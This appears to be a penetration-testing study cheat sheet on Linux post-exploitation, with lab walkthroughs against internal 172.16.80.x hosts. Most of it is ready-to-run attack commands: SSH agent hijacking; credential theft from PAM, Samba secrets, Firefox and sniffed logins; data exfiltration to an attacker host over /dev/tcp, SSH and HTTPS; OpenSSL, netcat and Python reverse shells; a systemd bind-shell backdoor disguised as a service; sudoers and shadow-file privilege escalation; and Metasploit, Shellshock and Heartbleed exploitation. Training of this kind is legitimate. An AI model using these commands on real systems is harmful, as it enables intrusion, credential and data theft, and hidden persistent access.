# Linux Post Exploitation Part 2

## Lateral Movements

[https://attack.mitre.org/](https://attack.mitre.org/)

[https://www.symantec.com/connect/articles/ssh-and-ssh-agent](https://www.symantec.com/connect/articles/ssh-and-ssh-agent)

#### SSH Hijacking
1. We first determine the SSH process ID of the user on the compromised host: `ps aux | grep sshd`
2. Next, we determine the SSH_AUTH_SOCK environment variable for the sshd PID: `grep SSH_AUTH_SOCK /proc/<PID>/environ`
3. We then hijack the targets ssh-agent socket: `SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add -l`
4. Finally, we log into the remote system our victim is logged into as the target: `ssh remotesystem -l victim`

For more information: [https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/](https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/)

#### Stealing SSH credentials

Suppose we are root and then collect as many credentials as possible. These may allow as to login to other systems in the domain as there would be password reuse tendency with the user.

[malicious PAM module](https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==)

[sshlooter](https://github.com/mthbernardes/sshLooter)

- transfer install.sh from sshlooter folder to target. `curl http://yourserverip:8080/install.sh | bash`

#### Samba sercrets to domain admin
This information is usually stored in 'secrets.tdb' and could be stored in '/var/lib/samba/private/'

If we are root we can `tdbdump /var/lib/samba/private/secrets.tdb`

The passwords will be NTLM hash.We can pass the hash pth-smbclient from the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).

More info: [https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9](https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9).

#### VPNPivot
VPNPivot creates a VPN tunnel between the attacker and compromised Linux host, and allows pivoting to other hosts internally within an organization that may be behind firewalls, NAT configurations, etc.

To install: [VPNPivot](https://github.com/0x36/VPNPivot.git)
`./autogen.sh`
`./configure`
`make && make install`

#### Dumping Stored Firefox credentials
[https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py](https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py)

Transfer code and execute in target system:
`python firefox_decrypt.py`
The tool will work if master password is not set.

***
***

## Data Exfiltartion

#### Exfiltration over TCP Socket with EBCDIC and Base64
[EBCDIC](https://en.wikipedia.org/wiki/EBCDIC)
- On our attacker machine
`nc -nvlp 80 > datafolder.tmp`
- On target system
`tar zcf - /tmp/datafolder | base64 | dd | conv=ebcdic > /dev/tcp/<attacker ip>/80`
- On our atatcker machine we decode the recieved the data
`dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tmp`
- Extract our tar archive:
`tar xf datafolder.tar`
	

#### Exfiltartion over SSH
- On our target system
`tar zcf - /tmp/datafolder | ssh root@<attacker_ip> "cd /tmp; tar zxpf -"`
- On attacker system
The data is already untarred and can be found inn/tmp/datafolder.
- For stealthiness we can configure ssh on port 80 rather port 22.

#### Exfiltration via POST Request over HTTPS
With this method we [POST](https://en.wikipedia.org/wiki/POST_(HTTP)) base64-encoded data over HTTPS to a PHP-based web server that is under our control. This method assumes you have a webserver that is PHP-enabled, and that you have an SSL certificate installed.

- On our attacker system;
`<php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?>`
we will call this file 'contact.php'.
- On victim machine
`curl --data "$(tar zcf - /tmp/datafolder | base64)" https://<attacker_server>/contact.php`
- Our system has recieved the data we need to decode it:
`cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar xf datafolder.tar`

***
***

## Maintaing access

#### OpenSSL Reverse Shell
[mkfifo](https://en.wikipedia.org/wiki/Named_pipe#In_Unix)
- Need to genrate ssl certificate key pair for our listner on the attacker machine.
`openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`
- Then we will start listner on our server.
`openssl s_server -quiet -key key.pem -cert cert.pem -port 443`
- Now on target system create mkfifo  named pipe called 'x' in /tmp. Then connect back to attacker.
`mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect <attacker_IP>:443 > /tmp/x; rm /tmp/x`

#### ICMP Reverse shell
It can acheived with tool [icmpsh](https://inquisb.github.io/icmpsh/)

Reverse-shell resources - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

#### Staged and stageless payload

Staged are often unstable and but stageless payload can be large in size.
[https://buffered.io/posts/staged-vs-stageless-handlers/](https://buffered.io/posts/staged-vs-stageless-handlers/).

#### Xinetd UDP portknock backdoor
[Xinetd](https://en.wikipedia.org/wiki/Xinetd) daemon which is used to manage network-based services on Linux systems.

When a packet is recieved in defined port then a netcat reverse shell is initiated. This concept is called [Port Knocking](https://en.wikipedia.org/wiki/Port_knocking).

Another bonus is that it will be persistent across reboots.
- Run the xinetd_server.sh bash script in target system.
[https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56](https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56)
Make sure to modify attacker IP and attacker port.
- On attacker machine open a netcat listner.
`nc -nlvp 4444`
- As final step initate a packet for port knock.
`hping3 -2 -c 1 <target ip> -p 65534`

#### Systemd Netcat Bind Shell
[Systemd](https://en.wikipedia.org/wiki/Systemd)
[UNIX System V init](https://en.wikipedia.org/wiki/Init#SysV-style)
- On the target sstem:
`cp /bin/nc /lib/systemd/systemd-service`
- On target system, we're going to create a file called /lib/systemd/system/systemmd.service.
`[UNIT]`
`Description = Systemd Service`
`After = network.target`
`[Service]`
`ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh`
`[Install]`
`WantedBy = multi-user.target`
- Enable our new Systemd Netcat Bind Shell service, and start our Systemd Netcat Bind shell service
`systemctl enable systemd.service`
`systemctl start systemd.service`
- Confirm port for our custom service is listening by,
`netstat -auntp | grep 56825`
- Then from our attacker machine we can connect by,
`nc <target ip> 56825`
***
***

## UDEV Exploit
- Check whether curent version of the udev is exploitable.
`dpkg -l | grep udev`
- Download exploit code and compile it.
- Find the PID of the udev.
`ps aux | grep udev`
- `'#!bin/bash\n/bin/cat /etc/shadow > /tmp/shadow' > /tmp/run`
- Run exploit with PID as argument
`./exploit [pid]`
***
***
## 3snake

[https://github.com/blendin/3snake](https://github.com/blendin/3snake)

Download the files to target.
Run the make command.
Run the `./3snake -h` for help.
Or we can run `./3snake` for getting credential when somebody trying to login to the system.

***
***

## bettercap for credentail stealing of ftp and http
`cp /usr/lib/ruby/vendor_ruby/bettercap/sniffer/parsers/ftp.rb .`
`cp /usr/lib/ruby/vendor_ruby/bettercap/sniffer/parsers/post.rb .`
`bettercap -X -I eth0 -T [victim ip],[victim2 ip] -P post,ftp`
And wai for any credentials.
***
***

## Lab: remote exploitation and post exploitaion

Task 1: Identify Vulnerabilities In Discovered Systems and Obtain Access
- `nmap -sS 172.16.80.27 -p1-65535`
- `nc 172.16.80.27 60666 (In one terminal)`
`nc 172.16.80.27 60667 (In the second terminal)`
`python -c 'import pty; pty.spawn("/bin/bash")'`
` sudo -l`
`cd /home/jordan && mkdir foo && cd foo`
`ln -s /etc/shadow readme.txt`
`export TERM=xterm`
`sudo /bin/nano /home/jordan/foo/readme.txt`

Of the users discovered via SMB enumeration, obtain access to 172.16.80.27 via SSH using one of them. Once access has been obtained with that user account, elevate privileges to root.

- `enum4linux -a 172.16.80.27`
- `head -n 500 /usr/share/wordlists/rockyou.txt > top-500.txt`
- `hydra -l james -P top-500.txt ssh://172.16.80.27`

Write a file to /tmp, in this case, we'll call the file "elevate," with the following contents:
- `#!/bin/bash`
`echo "james ALL=(root) NOPASSWD: ALL" >> /etc/sudoers`
- `chmod +x /tmp/elevate`
- `sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/elevate -Z root`
- `sudo bash`

Of the available SMB shares discovered during the enumeration of 172.16.80.27, one of them can be exploited to obtain access to the server.

- `smbmap -H 172.16.80.27`
- `nmap --script smb-enum-shares 172.16.80.27`
- `smbclient -N \\\\172.16.80.27\\web -U ""`
- `put perl-reverse-shell.pl`
- `nc -nlvp 1234`
- Access website

172.16.80.22 contains a remotely exploitable RMI Registry vulnerability. Exploit the vulnerability, and once access has been obtained as a low privileged user, identify a vulnerability in the kernel. Exploit the kernel vulnerability and obtain root access.

- `use exploit/multi/misc/java_rmi_server`
- `python -c 'import pty; pty.spawn("/bin/bash")'`
- `use exploit/linux/local/udev_netlink`

`72.16.80.22 contains a remotely exploitable vulnerability within its Samba server. Exploit the vulnerability to obtain access to the file system to conduct additional enumeration.

- `smbd --version`
- `use auxiliary/admin/smb/samba_symlink_traversal`

172.16.80.22 contains a remotely exploitable vulnerability on a web server port. Exploit the vulnerability and obtain access as the web server user via a shell. Use this access to elevate your privileges to root.
- `./dirsearch.py -u http://172.16.80.22/ -e cgi -r -f`
- `use auxiliary/scanner/http/apache_mod_cgi_bash_env`
- `set TARGETURI cgi-bin/calendar.cgi`
- `set CMD "/bin/nc <attacker_IP> 1234 -e /bin/sh"`
- `nc -nlvp 1234`
- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `find / -perm -4000 2>/dev/null`
- `nmap --interactive` and `!sh`
***
***

## Lab: Lateral movements

Task 1: Obtain access to other systems via Lateral Movement
- `nmap --script nfs-ls 172.16.80.27`
- `mkdir /mnt/172.16.80.27_nfs`
- `mount -t nfs 172.16.80.27:/home/simon /mnt/172.16.80.27_nfs -o nolock`
- `unzip backup.zip`
- `fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt backup.zip`
- `unzip -P '====0open/n' backup.zip`
- `cat notes.txt`
- Go to the website
- `nc -nlvp 1234`
- `https://172.16.80.24:4433/xl0827_dev_/?x=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

172.16.80.24 contains a remotely exploitable vulnerability which can be exploited to obtain access to another system as a user discovered during enumeration. Use the information obtained via the exploit to log onto another system. Exploit that users' privileged access to obtain root.
- `nmap --script +ssl-heartbleed 172.16.80.24 -p 4433`
- `use auxiliary/scanner/ssl/openssl_heartbleed`
- `set action DUMP`
- `strings /root/.msf4/loot/....openssl.heartble_151722.bin`
- `ssh amanda@172.16.80.27`
- `find / -perm -4000 2>/dev/null`
- `catme /etc/passwd`
- `cd /tmp`
`catme /etc/passwd > passwd`
`catme /etc/shadow > shadow`
- `python -m SimpleHTTPServer 8888`
- `wget http://172.16.80.27:8888/passwd`
- `wget http://172.16.80.27:8888/shadow`
- `unshadow passwd shadow > shadow.john`
- `john shadow.john --wordlist=/usr/share/wordlists/fasttrack.txt`
- `ssh damien@172.16.80.27`
- `sudo bash`


***
***